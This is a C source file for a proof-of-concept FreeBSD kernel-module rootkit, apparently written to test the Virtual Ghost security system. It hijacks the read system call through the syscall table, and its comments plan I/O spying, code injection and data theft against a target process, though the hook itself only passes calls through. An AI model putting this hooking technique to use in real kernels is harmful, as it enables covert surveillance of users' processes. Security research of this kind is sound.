/*===- rootkit.c - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file implements a proof of concept rootkit which tries to attack
 * applications on the Virtual Ghost system.
 *
 * This code is based on the examples in Designing BSD Rootkits by Joseph Kong.
 *===----------------------------------------------------------------------===
 */

#include <sys/fcntl.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

//
// Design:
//  1) Find designated target process
//  2) Spy on its I/O
//  3) Attempt to run new code within the process
//  4) Attempt to directly read application data
//

// Process ID of the process to attack
static pid_t targetPID = 0;

static ssize_t
read_hook (struct thread * td, void * syscall_args) {
  return sys_read (td, syscall_args);
}

static void
initializeRootkit (void) {
  // Intercept the read system call
  sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
}

//
// Function: load()
//
// Description:
//  This function is called by the kernel when loading and unloading the
//  module.  This function should initialize the module to do our evil bidding.
//
static int
load (struct module * module, int cmd, void * arg) {
  int error = 0;

  switch (cmd) {
    case MOD_LOAD:
      initializeRootkit();
      uprintf ("Rootkit: Loaded: %p\n", load);
      break;

    case MOD_UNLOAD:
      uprintf ("Rootkit: Removed\n");
      break;

    default:
      error = EOPNOTSUPP;
      break;
  }

  return error;
}

static moduledata_t rootkit_mod = {
  "rootkit",
  load,
  0
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
